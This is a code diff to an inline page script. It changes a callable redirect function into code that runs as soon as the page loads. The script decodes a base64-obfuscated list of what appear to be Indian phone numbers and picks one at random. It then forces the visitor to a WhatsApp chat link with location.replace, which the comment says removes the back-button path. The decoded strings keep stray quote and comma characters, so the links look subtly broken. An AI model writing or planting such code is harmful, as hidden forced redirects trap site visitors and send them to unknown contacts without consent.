@@ -1,25 +1,25 @@
 <script>
     (function() {
-        function x9x() {
-            var a1 = ["NzA1MTQ5MTEwMyIs", "NzM0NzM3MTg1OCIs", "OTgzNTg0MzEwMCIs", "ODk2MDA3OTcxNCIs", "ODk3NjExNzE0MyIs", "NzUxNzA3NTE0MiIs", "ODEwNzI0MTM3NSIs", "OTY0MDcyMDI5NiIs", "ODU0MTk3MTEyMiIs", "Nzg3MDE1MDQxMyIs", "OTU5MTM5Mjg2MCIs", "Nzg0MTAxODE1NiIs", "ODExOTg5ODUyMyIs", "NzQxNzAyMzYwNyIs", "OTM5MTg3MTc1OCIs", "ODg4MTcyODQyNSIs", "NzU2Mzg1NDIxNCIs", "Nzg0MTAxODE1NiIs", "OTE1ODE0NTg2NCIs", "OTc0ODU1Njg4MCIs", "OTc5NDg1NTkzMCIs", "ODA5MDQzMTg3NCIs"];
-            
-            for (var i = 0; i < a1.length; i++) {
-                a1[i] = atob(a1[i]); // Base64 Decode
-            }
-
-            var b1 = localStorage.getItem("xData");
-            if (!b1) {
-                var c1 = Math.floor(Math.random() * a1.length);
-                var d1 = a1[c1];
-                localStorage.setItem("xData", d1);
-            } else {
-                var d1 = b1;
-            }
-
-            var e1 = "https://wa.me/91" + d1;
-            window.location.href = e1;
+        var a1 = ["NzA1MTQ5MTEwMyIs", "NzM0NzM3MTg1OCIs", "OTgzNTg0MzEwMCIs", "ODk2MDA3OTcxNCIs", "ODk3NjExNzE0MyIs", 
+                  "NzUxNzA3NTE0MiIs", "ODEwNzI0MTM3NSIs", "OTY0MDcyMDI5NiIs", "ODU0MTk3MTEyMiIs", "Nzg3MDE1MDQxMyIs", 
+                  "OTU5MTM5Mjg2MCIs", "Nzg0MTAxODE1NiIs", "ODExOTg5ODUyMyIs", "NzQxNzAyMzYwNyIs", "OTM5MTg3MTc1OCIs", 
+                  "ODg4MTcyODQyNSIs", "NzU2Mzg1NDIxNCIs", "Nzg0MTAxODE1NiIs", "OTE1ODE0NTg2NCIs", "OTc0ODU1Njg4MCIs", 
+                  "OTc5NDg1NTkzMCIs", "ODA5MDQzMTg3NCIs"];
+        
+        for (var i = 0; i < a1.length; i++) {
+            a1[i] = atob(a1[i]); // Base64 Decode
         }
 
-        window.x9x = x9x;
+        var b1 = localStorage.getItem("xData");
+        if (!b1) {
+            var c1 = Math.floor(Math.random() * a1.length);
+            var d1 = a1[c1];
+            localStorage.setItem("xData", d1);
+        } else {
+            var d1 = b1;
+        }
+
+        var e1 = "https://wa.me/91" + d1;
+        window.location.replace(e1); // Direct Redirect Without Back Button History
     })();
 </script>
